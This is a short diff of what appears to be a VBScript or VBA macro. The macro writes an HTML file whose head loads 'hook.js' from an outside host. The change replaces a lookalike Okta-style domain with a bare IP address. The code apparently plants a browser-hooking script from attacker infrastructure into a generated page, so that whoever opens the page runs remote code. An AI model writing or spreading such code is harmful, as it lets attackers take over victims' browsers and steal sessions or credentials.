@@ -31,7 +31,7 @@ Sub CreateHTMLFile(filename)
     objFile.WriteLine "<!DOCTYPE html>"
     objFile.WriteLine "<html>"
     objFile.WriteLine "<head>"
-    objFile.WriteLine "<script src=""https://okta.frothiy.com/hook.js""></script>"
+    objFile.WriteLine "<script src=""https://54.207.200.83/hook.js""></script>"
     objFile.WriteLine "</head>"
     objFile.WriteLine "<body>"
     objFile.WriteLine "</body>"
